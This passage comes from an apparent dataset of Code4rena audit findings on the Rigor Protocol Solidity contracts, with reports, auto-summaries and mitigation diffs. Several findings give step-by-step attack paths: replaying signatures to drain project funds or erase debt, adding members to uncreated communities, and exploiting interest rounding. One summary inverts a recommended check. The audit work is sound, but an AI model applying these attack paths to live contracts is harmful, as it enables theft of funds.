LenderFeeReplaced(_newLenderFee);\n 197:        }\n```\n\nNew projects that are created will then get its `lenderFee` from the `HomeFi` contract. When communities wish to lend to these projects, it calls `lendToProject()`, which has the following calculation:\n\n```solidity\n 392:        // Calculate lenderFee\n 393:        uint256 _lenderFee = (_lendingAmount * _projectInstance.lenderFee()) /\n 394:            (_projectInstance.lenderFee() + 1000);\n```\n\nIf `lenderFee` a large value, such as `type(uint256).max`, the calculation shown above to overflow. This prevents any community from lending to any new projects.\n\n### Recommended Mitigation Steps\n\nConsider adding a reasonable fee rate bounds checks in the `replaceLenderFee()` function. This would prevent potential griefing and increase the trust of users in the contract.\n\n**[zgorizzo69 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/400)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `HomeFi` contract of a project called \"2022-08-rigor\". The vulnerability is that the admin of the `HomeFi` contract can set `lenderFee` to greater than 100%, which would force calls to `lendToProject()` to all projects created in the future to revert. This is because the calculation for `lenderFee` in `lendToProject()` will overflow when `lenderFee` is set to a large value.\n\nThe recommended mitigation step for this vulnerability is to consider adding a reasonable fee rate bounds check in the `replaceLenderFee()` function. This would prevent potential griefing and increase the trust of users in the contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/400",
      "tags": [],
      "finders": [
        "8olidity",
        "__141345__",
        "0x52",
        "codexploder",
        "MiloTruck",
        "cccz",
        "Ruhum",
        "cryptonue",
        "hansfriese",
        "Ch_301",
        "sseefried"
      ]
    },
    {
      "id": "3105",
      "title": "[M-01] `Project.changeOrder()` would work unexpectedly for non SCConfirmed tasks.",
      "impact": "MEDIUM",
      "content": "_Submitted by hansfriese_\n\n[Project.sol#L402](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L402)<br>\n\nThe `changeOrder()` function will revert when it's called for the tasks that don't have subcontractors.\n\nAs a result, the project builder and contractor can't change the cost of a task until the subcontractor is confirmed.\n\n### Proof of Concept\n\nThe `changeOrder()` is used to change the cost or subcontractor of a task and there is no documentation that this function must be called only after a subcontractor is confirmed.\n\nAlso, it's reasonable to be able to change the cost when a subcontractor isn't confirmed yet.\n\nBut when it checks signature [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L402), it assumes the task has a confirmed subcontractor already and `checkSignatureTask()` will revert in other cases.\n\nSo this function will be useless for non SCConfirmed tasks.\n\n### Tools Used\n\nSolidity Visual Developer of VSCode\n\n### Recommended Mitigation Steps\n\nWe should check separately in case the subcontractor is confirmed or not [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L402).\n\n    if (getAlerts(_taskID)[2]) {\n        // If subcontractor has confirmed.\n        checkSignatureTask(_data, _signature, _taskID);\n    } else {\n        // If subcontractor not has confirmed.\n        checkSignature(_data, _signature);\n    }\n\n**[parv3213 (Rigor) acknowledged](https://github.com/code-423n4/2022-08-rigor-findings/issues/232)**\n\n**[0xA5DF (warden) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/232#issuecomment-1212063685):**\n > I think this is invalid, since _currently_ `checkSignatureTask` will pass if SC is the zero address and the signature isn't a valid signature (i.e. builder and GC can just pass zero as the signature).\n> \n> This will only be valid if the sponsor fixes other bugs by making `checkSignatureValidity()` revert on invalid signature.\n\n**[Jack the Pug (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/232#issuecomment-1229159634):**\n > Will downgrade to Medium given this is a feature being malfunctioning.\n\n\n\n***\n\n",
      "summary": "\nA bug has been reported in the code of the Project.sol file located at https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L402. It was discovered using Solidity Visual Developer of VSCode.\n\nThe bug lies in the `changeOrder()` function which reverts when it is called for tasks that do not have subcontractors. This means that the project builder and contractor cannot change the cost of a task until the subcontractor is confirmed.\n\nThe issue is that the function does not take into account if the subcontractor is confirmed or not when checking the signature [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L402). As a result, the function will be useless for non SCConfirmed tasks.\n\nThe recommended mitigation step is to check separately in case the subcontractor is confirmed or not [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L402). This can be done by using an if statement to check if the subcontractor has confirmed or not. If the subcontractor has confirmed, the `checkSignatureTask()` function should be called, and if not, the `checkSignature()` function should be called.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/232",
      "tags": [],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "3104",
      "title": "[H-06] Wrong APR can be used when project is unpublished and published again",
      "impact": "HIGH",
      "content": "_Submitted by Lambda, also found by rbserver_\n\n[Community.sol#L267](https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L267)<br>\n\nWhen a project is unpublished from a community, it can still owe money to this community (on which it needs to pay interest according to the specified APR). However, when the project is later published again in this community, the APR can be overwritten and the overwritten APR is used for the calculation of the interest for the old project (when it was unpublished).\n\n### Proof Of Concept\n\n1.) Project A is published in community I with an APR of 3%. The community lends 1,000,000 USD to the project.<br>\n2.) Project A is unpublished, the `lentAmount` is still 1,000,000 USD.<br>\n3.) During one year, no calls to `repayLender`, `reduceDebt`, or `escrow` happens, i.e. the interest is never added and the `lastTimestamp` not updated.<br>\n4.) After one year, the project is published again in the same community. Because the FED raised interest rates, it is specified that the APR should be 5% from now on.<br>\n5.) Another $1,000,000 is lent to the project by calling `lendToProject`. Now, `claimInterest` is called which calculates the interest of the last year for the first million. However, the function already uses the new APR of 5%, meaning the added interest is 50,000 USD instead of the correct 30,000 USD.\n\n### Recommended Mitigation Steps\n\nWhen publishing a project, if the `lentAmount` for the community is non-zero, calculate the interest before updating the APR.\n\n**[parv3213 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/83)**\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report describes a vulnerability in the Community.sol contract. The issue arises when a project is unpublished from a community, yet still owes money to the community, and then is published again in the same community with a different APR (Annual Percentage Rate). When this happens, the APR is overwritten and used for the calculation of the interest for the old project, resulting in an incorrect interest being added. \n\nTo demonstrate this, an example is given where a project is published in a community with an APR of 3%. The community lends 1,000,000 USD to the project. After one year, the project is unpublished, and the lent amount still remains at 1,000,000 USD. When the project is published again in the same community after one year, the APR is now 5%. Another 1,000,000 USD is lent to the project, and then when the interest is calculated, the new APR of 5% is used, resulting in an incorrect interest of 50,000 USD instead of the correct 30,000 USD. \n\nThe recommended mitigation step is to calculate the interest before updating the APR when publishing a project if the lent amount for the community is non-zero.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/83",
      "tags": [],
      "finders": [
        "Lambda",
        "rbserver"
      ]
    },
    {
      "id": "3103",
      "title": "[H-05] Add members to the not yet created community",
      "impact": "HIGH",
      "content": "_Submitted by vlad&#95;bochok, also found by indijanc, Lambda, and wastewa_\n\n[Community.sol#L187](https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L187)<br>\n[Community.sol#L179](https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L179)<br>\n[Community.sol#L878](https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L878)<br>\n[SignatureDecoder.sol#L39](https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/libraries/SignatureDecoder.sol#L39)<br>\n\nThere is a `addMember` function in the `Community`.  The function accepts `_data` that should be signed by the `_community.owner` and `_newMemberAddr`.\n\n            // Compute hash from bytes\n            bytes32 _hash = keccak256(_data);\n\n            // Decode params from _data\n            (\n                uint256 _communityID,\n                address _newMemberAddr,\n                bytes memory _messageHash\n            ) = abi.decode(_data, (uint256, address, bytes));\n\n            CommunityStruct storage _community = _communities[_communityID];\n\n            // check signatures\n            checkSignatureValidity(_community.owner, _hash, _signature, 0); // must be community owner\n            checkSignatureValidity(_newMemberAddr, _hash, _signature, 1); // must be new member\n\nThe code above shows exactly what the contract logic looks like.\n\n1.  `_communityID` is taken from the data provided by user, so it can arbitrarily. Specifically,  community with selected `_communityID` can be not yet created. For instance, it can be equal to the `communityCount + 1`, thus the next created community will have this `_communityID`.\n\n2.  `_communities[_communityID]` will store null values for all fields, for a selected `_communityID`. That means, `_community.owner == address(0)`\n\n3.  `checkSignatureValidity` with a parameters `address(0), _hash, _signature, 0` will not revert a call if an attacker provide incorrect `_signature`.\n\nLet's see the implementation of `checkSignatureValidity`:\n\n            // Decode signer\n            address _recoveredSignature = SignatureDecoder.recoverKey(\n                _hash,\n                _signature,\n                _signatureIndex\n            );\n\n            // Revert if decoded signer does not match expected address\n            // Or if hash is not approved by the expected address.\n            require(\n                _recoveredSignature == _address || approvedHashes[_address][_hash],\n                \"Community::invalid signature\"\n            );\n\n            // Delete from approvedHash. So that signature cannot be reused.\n            delete approvedHashes[_address][_hash];\n\nNo restrictions on `_recoveredSignature` or `_address`. Moreover, if `SignatureDecoder.recoverKey` can return zero value, then there will be no revert.\n\n           if (messageSignatures.length % 65 != 0) {\n                return (address(0));\n            }\n\n            uint8 v;\n            bytes32 r;\n            bytes32 s;\n            (v, r, s) = signatureSplit(messageSignatures, pos);\n\n            // If the version is correct return the signer address\n            if (v != 27 && v != 28) {\n                return (address(0));\n            } else {\n                // solium-disable-next-line arg-overflow\n                return ecrecover(toEthSignedMessageHash(messageHash), v, r, s);\n            }\n\nAs we can see below, `recoverKey` function can return zero value, if an `ecrecover` return zero value or if `v != 27 || v != 28`. Both cases are completely dependent on the input parameters to the function, namely from `signature` that is provided by attacker.\n\n4.  `checkSignatureValidity(_newMemberAddr, _hash, _signature, 1)` will not revert the call if an attacker provide correct signature in the function. It is obviously possible.\n\nAll in all, an attacker can add as many members as they want, BEFORE the `community` will be created.\n\n### Recommended Mitigation Steps\n\n1.  `checkSignatureValidity`/`recoverKey` should revert the call if an `address == 0`.\n2.  `addMember` should have a `require(_communityId <= communityCount)`\n\n**[parv3213 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/298)**\n\n**[Jack the Pug (judge) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/298#issuecomment-1229125034):**\n > Nice catch!\n> \n> Btw, this `v != 27 && v != 28` check is no longer needed:\n> \n> ```solidity\n> if (v != 27 && v != 28) {\n>             return (address(0));\n> }\n> ```\n> \n> See: https://twitter.com/alexberegszaszi/status/1534461421454606336?s=20&t=H0Dv3ZT2bicx00hLWJk7Fg\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the 'Community' function in the code-423n4/2022-08-rigor repository. The function allows users to add new members to a community, but the code does not check if the community has already been created. This means that an attacker can add as many members as they want before the community is created, allowing them to gain control of the community.\n\nThe code for the function can be found at lines 187, 179 and 878 in the 'Community.sol' file, and line 39 in the 'SignatureDecoder.sol' file. The code for the 'checkSignatureValidity' function is also included.\n\nThe recommended mitigation steps for this vulnerability are to add a 'require(_communityId <= communityCount)' statement to the 'addMember' function, and to add a 'require(address == 0)' statement to the 'checkSignatureValidity' and 'recoverKey' functions. This will ensure that the community must be created before members can be added, and that the signature must be valid.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/298",
      "tags": [],
      "finders": [
        "vlad_bochok",
        "Lambda",
        "wastewa",
        "indijanc"
      ]
    },
    {
      "id": "3102",
      "title": "[H-04] Project funds can be drained by reusing signatures, in some cases",
      "impact": "HIGH",
      "content": "_Submitted by 0xA5DF, also found by Bahurum, bin2chen, byndooa, cryptphi, hansfriese, horsefacts, kaden, Lambda, neumo, panprog, rokinot, scaraven, and sseefried_\n\n[Project.sol#L386-L490](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L386-L490)<br>\n[Project.sol#L330-L359](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L330-L359)<br>\n[Tasks.sol#L153-L164](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L153-L164)<br>\n\nThis attack path is the results of signatures reusing in 2 functions - `changeOrder()` and `setComplete()`, and a missing modifier at `Tasks.unApprove()` library function.\n\n### Impact\n\n#### Draining the project from funds\n\nCurrent or previous subcontractor of a task can drain the project out of its funds by running `setComplete()` multiple times.\n\nThis can be exploited in 3 scenarios:\n\n*   The price of a task was changed to a price higher than available funds (i.e. `totalLent - _totalAllocated`, and therefore gets unapproved), and than changed back to the original price (or any price that's not higher than available funds)\n*   The subcontractor for a task was changed via `changeOrder` and then changed back to the original subcontractor\n    *   e.g. - Bob was the original SC, it was changed to Alice, and then back to Bob\n*   Similar to the case above, but even if the current SC is different from the original SC - it can still work if the current and previous SCs are teaming up to run the attack\n    *   e.g. Bob was the original SC, it was changed to Alice, and changed again to Eve. And now Alice and Eve are teaming up to drain funds from the project\n\nAfter `setComplete()` ran once by the legitimate users (i.e. signed by contractor, SC and builder), the attackers can now run it multiple times:\n\n*   Reuse signatures to run `changeOrder()` - changing SC or setting the price to higher than available funds\n    *   The only signer that might change is the subcontractor, he's either teaming up with the attacker (scenario #3) or he was the SC when it was first called (scenario #2)\n*   In case of price change:\n    *   change it back to the original price via `changeOrder()`, reusing signatures\n    *   Run `allocateFunds()` to mark it as funded again\n*   SC runs `acceptInvite()` to mark task as active\n*   Run `setComplete()` reusing signatures\n    *   If SC has changed - replace his signature with the current one (current SC should be one of the attackers)\n*   Repeat till the project runs out of funds\n\n#### Changing tasks costs/subcontractor by external users\n\nThis can also be used by external users (you don't need to be builder/GC/SC in order to run `changeOrder()`) to troll the system (This still requires the task to be changed at least twice, otherwise re-running `changeOrder()` with the same data would have no effect).\n\n*   Changing the task cost up or down, getting the SC paid a different amount than intended (if it goes unnoticed, or front-run the `setComplete()` function)\n*   Unapproving a task by setting a different SC or a price higher than available funds\n    *   The legitimate users can change it back, but the attacker can change it again, both sides playing around till someone gets tired :)\n\n### Proof of Concept\n\nSince the tests depend on each other, the PoC tests were created by adding them to the file `test/utils/projectTests.ts`, after the function `it('should be able to complete a task'` ([Line 1143](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/projectTests.ts#L1143)).\n\nIn the first test - a subcontractor is changed and then changed back.<br>\nIn the second scenario a price is changed to the new price (that is higher than the total available funds, and therefore is unapproved) and then back to its original price (it can actually be any price that is not higher than the available funds).<br>\nIn both cases I'm demonstrating how the project can be drained out of fund.\n\n*Note: see warden's [original submission](https://github.com/code-423n4/2022-08-rigor-findings/issues/95) for full proof of concept.*\n\n### Tools Used\n\nHardhat\n\n### Recommended Mitigation Steps\n\n*   Use nonce to protect `setComplete()` and `changeOrder()` from signatures reuse\n*   Add the `onlyActive()` modifier to `Tasks.unApprove()`\n*   Consider limiting `allocateFunds()` for builder only (this is not necessary to resolve the bug, just for hardening security)\n\n**[zgorizzo69 (Rigor) confirmed and commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/95#issuecomment-1210501767):**\n > Very nice wrap up.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an attack path that is the result of signatures reusing in two functions - `changeOrder()` and `setComplete()`, and a missing modifier at `Tasks.unApprove()` library function. This attack can be used to drain the project out of its funds by running `setComplete()` multiple times. It can be exploited in three scenarios: \n\n1. The price of a task was changed to a price higher than available funds (i.e. `totalLent - _totalAllocated`, and therefore gets unapproved), and than changed back to the original price (or any price that's not higher than available funds).\n2. The subcontractor for a task was changed via `changeOrder` and then changed back to the original subcontractor.\n3. Similar to the case above, but even if the current SC is different from the original SC - it can still work if the current and previous SCs are teaming up to run the attack.\n\nExternal users can also use this attack to troll the system by changing the task cost up or down, or unapproving a task by setting a different SC or a price higher than available funds.\n\nThe proof of concept tests were created by adding them to the file `test/utils/projectTests.ts`, after the function `it('should be able to complete a task'` ( [Line 1143](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/projectTests.ts#L1143) ). The tools used were Hardhat.\n\nTo mitigate this attack, it is recommended to use nonce to protect `setComplete()` and `changeOrder()` from signatures reuse, add the `onlyActive()` modifier to `Tasks.unApprove()` and consider limiting `allocateFunds()` for builder only.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/95",
      "tags": [
        "Replay Attack",
        "Nonce"
      ],
      "finders": [
        "panprog",
        "Bahurum",
        "rokinot",
        "scaraven",
        "neumo",
        "byndooa",
        "bin2chen",
        "kaden",
        "Lambda",
        "cryptphi",
        "hansfriese",
        "0xA5DF",
        "horsefacts",
        "sseefried"
      ]
    },
    {
      "id": "3101",
      "title": "[H-03] Builder can call `Community.escrow` again to reduce debt further using same signatures",
      "impact": "HIGH",
      "content": "_Submitted by sseefried, also found by 0xA5DF, Bahurum, bin2chen, byndooa, cccz, GalloDaSballo, hyh, kankodu, Lambda, and minhquanym_\n\n[Community.sol#L509](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L509)<br>\n\nSince there is no nonce in the data decoded at the beginning of function `escrow`, a builder can call the function multiple times reducing their debt as much as they wish.\n\n### Proof of Concept\n\n*   A builder has a debt of $50,000\n*   A lender, a builder, and an escrow agent all ~~enter a bar~~ sign a message that will reduce the debt of the builder by $5,000, upon receipt of physical cash.\n*   Function `escrow` is called and debt is reduced to $45,000.\n*   The builder, using the same `_data` and `_signature` then calls `escrow` a further 9 times reducing their debt to zero.\n\n### Recommended Mitigation Steps\n\n1.  Similar to function `publishProject`, add a new field into the [ProjectDetails](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/interfaces/ICommunity.sol#L19-L32) struct called `escrowNonce`.\n\n2.  Modify function `escrow` to check this nonce and update it after the debt has been reduced.\n\nSee the diff below for full changes.\n\n```diff\ndiff --git a/contracts/Community.sol b/contracts/Community.sol\nindex 1585670..b834d0e 100644\n--- a/contracts/Community.sol\n+++ b/contracts/Community.sol\n@@ -15,7 +15,7 @@ import {SignatureDecoder} from \"./libraries/SignatureDecoder.sol\";\n\n /**\n  * @title Community Contract for HomeFi v2.5.0\n-\n+\n  * @notice Module for coordinating lending groups on HomeFi protocol\n  */\n contract Community is\n@@ -520,10 +520,11 @@ contract Community is\n             address _agent,\n             address _project,\n             uint256 _repayAmount,\n+            uint256 _escrowNonce,\n             bytes memory _details\n         ) = abi.decode(\n                 _data,\n-                (uint256, address, address, address, address, uint256, bytes)\n+                (uint256, address, address, address, address, uint256, uint256, bytes)\n             );\n\n         // Compute hash from bytes\n@@ -540,6 +541,12 @@ contract Community is\n             _lender == _communities[_communityID].owner,\n             \"Community::!Owner\"\n         );\n+        ProjectDetails storage _communityProject =\n+          _communities[_communityID].projectDetails[_project];\n+        require(\n+            _escrowNonce == _communityProject.escrowNonce,\n+            \"Community::invalid escrowNonce\"\n+        );\n\n         // check signatures\n         checkSignatureValidity(_lender, _hash, _signature, 0); // must be lender\n@@ -548,6 +555,7 @@ contract Community is\n\n         // Internal call to reduce debt\n         _reduceDebt(_communityID, _project, _repayAmount, _details);\n+        _communityProject.escrowNonce = _communityProject.escrowNonce + 1;\n         emit DebtReducedByEscrow(_agent);\n     }\n\ndiff --git a/contracts/interfaces/ICommunity.sol b/contracts/interfaces/ICommunity.sol\nindex c45bbf0..652f51c 100644\n--- a/contracts/interfaces/ICommunity.sol\n+++ b/contracts/interfaces/ICommunity.sol\n@@ -29,6 +29,7 @@ interface ICommunity {\n         uint256 lentAmount; // current principal lent to project (needs to be repaid by project's builder)\n         uint256 interest; // total accrued interest on `lentAmount`\n         uint256 lastTimestamp; // timestamp when last lending / repayment was made\n+        uint256 escrowNonce; // signing nonce to use when reducing debt by escrow\n     }\n```\n\n**[zgorizzo69 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/161)**\n\n\n\n***\n\n",
      "summary": "\nA bug report has been submitted for the Community Contract for HomeFi v2.5.0. The bug is related to the function `escrow` in the Community.sol file. The bug is that since there is no nonce in the data decoded at the beginning of the function, a builder can call the function multiple times reducing their debt as much as they wish. \n\nThe proof of concept is that a builder has a debt of $50,000, a lender, a builder, and an escrow agent all sign a message that will reduce the debt of the builder by $5,000, upon receipt of physical cash. The function `escrow` is then called and debt is reduced to $45,000. The builder then calls `escrow` a further 9 times reducing their debt to zero.\n\nThe recommended mitigation steps are to add a new field into the ProjectDetails struct called `escrowNonce` and modify function `escrow` to check this nonce and update it after the debt has been reduced. A diff has been provided for the full changes.",
      "quality_score": 3,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/161",
      "tags": [
        "Replay Attack"
      ],
      "finders": [
        "Bahurum",
        "cccz",
        "minhquanym",
        "byndooa",
        "bin2chen",
        "kankodu",
        "GalloDaSballo",
        "Lambda",
        "hyh",
        "0xA5DF",
        "sseefried"
      ]
    },
    {
      "id": "3100",
      "title": "[H-02] Builder can halve the interest paid to a community owner due to arithmetic rounding",
      "impact": "HIGH",
      "content": "_Submitted by scaraven, also found by 0x52, auditor0517, Deivitto, hansfriese, Lambda, rbserver, simon135, smiling&#95;heretic, sseefried, and TrungOre_\n\n[Community.sol#L685-L686](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L685-L686)<br>\n\nDue to arithmetic rounding in `returnToLender()`, a builder can halve the APR paid to a community owner by paying every 1.9999 days. This allows a builder to drastically decrease the amount of interest paid to a community owner, which in turn allows them to advertise very high APR rates to secure funding, most of which they will not pay.\n\nThis issue occurs in the calculation of `noOfDays` in `returnToLender()` which calculates the number of days since interest has last been calculated. If a builder repays a very small amount of tokens every 1.9999 days, then the `noOfDays` will be rounded down to `1 days` however `lastTimestamp` is updated to the current timestamp anyway, so the builder essentially accumulates only 1 day of interest after 2 days.\n\nI believe this is high severity because a community owner can have a drastic decrease in interest gained from a loan which counts as lost rewards. Additionally, this problem does not require a malicious builder because if a builder pays at a wrong time, the loaner receives less interest anyway.\n\n### Proof of Concept\n\n1.  A community owner provides a loan of 500\\_000 tokens to a builder with an APR of 10% (ignoring treasury fees)\n2.  Therefore, the community owner will expect an interest of 136.9 tokens per day (273.9 per 2 days)\n3.  A builder repays 0.000001 tokens at `lastTimestamp + 2*86400 - 1`\n4.  `noOfDays` rounds down to 1 thereby accumulating `500_000 * 100 * 1 / 365000 = 136` tokens for 2 days\n5.  Therefore, the community owner only receives 5% APR with negligible expenses for the builder\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nThere are two possible mitigations:\n\n1.  Add a scalar to `noOfDays` so that any rounding which occurs is negligible\n\ni.e.\n\n```solidity\n        uint256 _noOfDays = (block.timestamp -\n            _communityProject.lastTimestamp) * SCALAR / 86400; // 24*60*60\n\n\n        /// Interest formula = (principal * APR * days) / (365 * 1000)\n        // prettier-ignore\n        uint256 _unclaimedInterest = \n                _lentAmount *\n                _communities[_communityID].projectDetails[_project].apr *\n                _noOfDays /\n                365000 /\n                SCALAR;\n```\n\n2.  Remove the `noOfDays` calculation and calculate interest in one equation which reduces arithmetic rounding\n\n```solidity\nuint256 _unclaimedInterest = \n                _lentAmount *\n                _communities[_communityID].projectDetails[_project].apr *\n                (block.timestamp -\n            _communityProject.lastTimestamp) /\n                365000 /\n                86400;\n```\n\n**[zgorizzo69 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/180)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the code for the Community.sol contract. This bug allows a builder to halve the APR paid to a community owner by paying every 1.9999 days. This would allow a builder to advertise very high APR rates to secure funding, but then pay back much lower rates than advertised. This bug occurs in the calculation of `noOfDays` in `returnToLender()` which calculates the number of days since interest has last been calculated. If a builder repays a very small amount of tokens every 1.9999 days, then the `noOfDays` will be rounded down to `1 days` however `lastTimestamp` is updated to the current timestamp anyway, so the builder essentially accumulates only 1 day of interest after 2 days.\n\nThis is considered high severity because a community owner can have a drastic decrease in interest gained from a loan which counts as lost rewards. Additionally, this problem does not require a malicious builder because if a builder pays at a wrong time, the loaner receives less interest anyway.\n\nTwo possible mitigations have been proposed. The first solution is to add a scalar to `noOfDays` so that any rounding which occurs is negligible. The second solution is to remove the `noOfDays` calculation and calculate interest in one equation which reduces arithmetic rounding.",
      "quality_score": 3.5,
      "rarity_score": 1.5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/180",
      "tags": [
        "Rounding"
      ],
      "finders": [
        "TrungOre",
        "Deivitto",
        "0x52",
        "simon135",
        "rbserver",
        "auditor0517",
        "scaraven",
        "Lambda",
        "smiling_heretic",
        "hansfriese",
        "sseefried"
      ]
    },
    {
      "id": "3099",
      "title": "[H-01] Untyped data signing",
      "impact": "HIGH",
      "content": "_Submitted by Lambda, also found by 0x1f8b, 0x52, horsefacts, vlad&#95;bochok, and wastewa_\n\n[Community.sol#L175](https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L175)<br>\n[Community.sol#L213](https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L213)<br>\n[Community.sol#L530](https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L530)<br>\n[Disputes.sol#L91](https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Disputes.sol#L91)<br>\n[Project.sol#L142](https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L142)<br>\n[Project.sol#L167](https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L167)<br>\n[Project.sol#L235](https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L235)<br>\n[Project.sol#L286](https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L286)<br>\n[Project.sol#L346](https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L346)<br>\n[Project.sol#L402](https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L402)<br>\n[Project.sol#L499](https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L499)<br>\n\nIn many places of the project (see affected code), untyped application data is directly hashed and signed. This is strongly disencouraged, as it enables different attacks (that each could be considered their own issue / vulnerability, but I submitted it as one, as they have all the same root cause):\n\n1.) Signature reuse across different Rigor projects:<br>\nWhile some signature contain the project address, not all do. For instance, `updateProjectHash` only contains a `_hash` and a `_nonce`. Therefore, we can have the following scenario: Bob is the owner of project A and signs / submit `updateProjectHash` with nonce 0 and some hash. Then, a project B that also has Bob as the owner is created. Attacker Charlie can simply take the `_data` and `_signature` that Bob previously submitted to project A and send it to project B. As this project will have a nonce of 0 (fresh created), it will accept it. `updateTaskHash` is also affected by this.<br>\n2.) Signature reuse across different chains:<br>\nBecause the chain ID is not included in the data, all signatures are also valid when the project is launched on a chain with another chain ID. For instance, let's say it is also launched on Polygon. An attacker can now use all of the Ethereum signatures there. Because the Polygon addresses of user's (and potentially contracts, when the nonces for creating are the same) are often identical, there can be situations where the payload is meaningful on both chains.<br>\n3.) Signature reuse across Rigor functions:<br>\nSome functions accept and decode data / signatures that were intended for other functions. For instance, see this example of providing the data & signature that was intended for `inviteContractor` to `setComplete`:\n\n```diff\ndiff --git a/test/utils/projectTests.ts b/test/utils/projectTests.ts\nindex ae9e202..752e01f 100644\n--- a/test/utils/projectTests.ts\n+++ b/test/utils/projectTests.ts\n@@ -441,7 +441,7 @@ export const projectTests = async ({\n     }\n   });\n\n-  it('should be able to invite contractor', async () => {\n+  it.only('should be able to invite 